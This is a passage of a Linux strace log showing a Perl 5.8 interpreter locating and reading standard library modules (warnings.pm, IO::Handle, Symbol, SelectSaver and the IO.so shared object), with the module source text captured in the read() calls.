\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
12010 20:22:35.193342 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
12010 20:22:35.194194 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
12010 20:22:35.194340 read(8, "", 4096) = 0
12010 20:22:35.194354 close(8)          = 0
12010 20:22:35.194511 _llseek(6, 412, [412], SEEK_SET) = 0
12010 20:22:35.194527 _llseek(6, 0, [412], SEEK_CUR) = 0
12010 20:22:35.194538 close(6)          = 0
12010 20:22:35.194586 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12010 20:22:35.194654 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12010 20:22:35.194686 futex(0xb7f49070, 0x81 /* FUTEX_??? */, 2147483647) = 0
12010 20:22:35.194704 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
12010 20:22:35.194718 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n
12010 20:22:35.194812 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12010 20:22:35.194838 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f4d000
12010 20:22:35.194852 mmap2(0xb7f51000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f51000
12010 20:22:35.194867 close(6)          = 0
12010 20:22:35.195000 stat64("/etc/perl/IO/Handle.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195017 stat64("/etc/perl/IO/Handle.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195031 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195044 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195059 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195072 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195087 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195098 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195098 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195098 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195098 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.195099 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
12010 20:22:35.195099 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
12010 20:22:35.195099 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79ee8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.195099 _llseek(6, 0, [0], SEEK_CUR) = 0
12010 20:22:35.195114 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
12010 20:22:35.195478 stat64("/etc/perl/Symbol.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195513 stat64("/etc/perl/Symbol.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195527 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195540 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195555 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195568 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195582 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195594 stat64("/usr/lib/perl5/Symbol.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195608 stat64("/usr/share/perl5/Symbol.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195620 stat64("/usr/share/perl5/Symbol.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195633 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195646 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195660 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.195672 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
12010 20:22:35.195700 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.195715 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.195727 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.195745 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
12010 20:22:35.196147 read(8, "", 4096) = 0
12010 20:22:35.196176 close(8)          = 0
12010 20:22:35.196243 stat64("/etc/perl/SelectSaver.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196260 stat64("/etc/perl/SelectSaver.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196275 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196289 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196303 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196317 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196339 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196381 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196396 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196422 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196436 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196450 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196464 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.196482 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
12010 20:22:35.196504 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.196519 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.196531 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.196551 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
12010 20:22:35.196679 brk(0x81d6000)    = 0x81d6000
12010 20:22:35.196710 read(8, "", 4096) = 0
12010 20:22:35.196722 close(8)          = 0
12010 20:22:35.197137 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
12010 20:22:35.197764 read(6, "", 4096) = 0
12010 20:22:35.197787 close(6)          = 0
12010 20:22:35.197837 stat64("/etc/perl/IO/Seekable.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197855 stat64("/etc/perl/IO/Seekable.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197869 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197883 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197897 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197910 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197925 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197937 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197951 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197964 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197977 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.197991 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
12010 20:22:35.198013 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
12010 20:22:35.198028 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79ee8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.198040 _llseek(6, 0, [0], SEEK_CUR) = 0
